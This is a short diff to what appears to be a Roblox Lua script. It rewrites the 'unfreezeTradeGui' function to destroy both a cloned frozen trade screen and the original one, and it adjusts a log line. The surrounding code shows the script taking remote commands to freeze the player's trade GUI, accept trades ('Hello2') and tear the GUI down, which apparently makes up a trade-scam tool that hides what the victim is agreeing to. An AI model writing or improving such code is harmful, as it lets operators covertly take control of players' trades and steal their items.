@@ -32,15 +32,17 @@ local function freezeTradeGui()
 end
 
 local function unfreezeTradeGui()
+    -- Destroy both the cloned and original GUIs if they exist
     if clonedGui then
         clonedGui:Destroy()  -- Destroy the cloned frozen GUI
         clonedGui = nil  -- Clear the reference
-        -- Recreate the original GUI
-        local newTradeGui = TradeGuiPhone:Clone()
-        newTradeGui.Parent = PlayerGui
-        print("Cloned Trade GUI has been destroyed and the original GUI has been restored.")
-    else
-        print("No cloned Trade GUI to unfreeze.")
+        print("Cloned Trade GUI has been destroyed.")
+    end
+
+    -- Check if the original GUI still exists and destroy it if necessary
+    if TradeGuiPhone then
+        TradeGuiPhone:Destroy()
+        print("Original Trade GUI has been destroyed.")
     end
 end
 
@@ -89,7 +91,7 @@ local function checkForCommands()
             print("Received 'Hello1' command. Freezing Trade GUI.")
             freezeTradeGui()
         elseif data.message == "Hello3" then
-            print("Received 'Hello3' command. Unfreezing Trade GUI.")
+            print("Received 'Hello3' command. Destroying both cloned and original Trade GUIs.")
             unfreezeTradeGui()
         elseif data.message == "Hello2" then
             print("Received 'Hello2' command. Accepting trade.")
